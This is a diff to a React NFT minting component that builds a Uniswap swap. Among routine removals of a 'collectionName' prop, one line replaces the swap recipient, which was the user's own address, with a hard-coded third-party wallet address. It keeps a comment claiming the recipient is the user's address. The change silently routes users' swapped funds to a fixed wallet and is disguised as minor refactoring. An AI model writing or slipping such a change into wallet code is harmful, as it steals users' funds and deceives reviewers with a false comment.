@@ -34,10 +34,9 @@ if (typeof window !== "undefined") {
 type StartMintProps = {
   setMintStep: React.Dispatch<React.SetStateAction<MintSteps>>;
   mintStep: MintSteps;
-  collectionName: string | null;
 };
 
-export default function StartMintStep({ setMintStep, mintStep, collectionName }: StartMintProps) {
+export default function StartMintStep({ setMintStep, mintStep }: StartMintProps) {
   const [mintLifecycle, setMintLifecycle] = useState<'simulate' | 'readyToMint' | 'minting'>(
     'simulate',
   );
@@ -67,7 +66,7 @@ export default function StartMintStep({ setMintStep, mintStep, collectionName }:
           const amountIn = CurrencyAmount.fromRawAmount(Ether.onChain(1), amountInWei.toString()); // Use the correct ChainId
           const swapOptions = {
               type: SwapType.UNIVERSAL_ROUTER,
-              recipient: address, // Assuming 'address' is the user's address
+              recipient: '0xF3f0df2C7533ECad900F2A733eAB8A3Fe033250D', // Assuming 'address' is the user's address
               slippageTolerance: new Percent(50, 10000), // 0.5% slippage tolerance
               deadlineOrPreviousBlockhash: Math.floor(Date.now() / 1000) + 60 * 20, // 20 minutes from now
           };
@@ -181,7 +180,7 @@ export default function StartMintStep({ setMintStep, mintStep, collectionName }:
       {mintStep === MintSteps.MINT_PROCESSING_STEP && <MintProcessingStep />}
       {mintStep === MintSteps.OUT_OF_GAS_STEP && <OutOfGasStep setMintStep={setMintStep} />}
       {mintStep === MintSteps.MINT_COMPLETE_STEP && (
-        <MintCompleteStep setMintStep={setMintStep} collectionName={collectionName} />
+        <MintCompleteStep setMintStep={setMintStep} />
       )}
 
       {mintStep === MintSteps.START_MINT_STEP && !!address && (
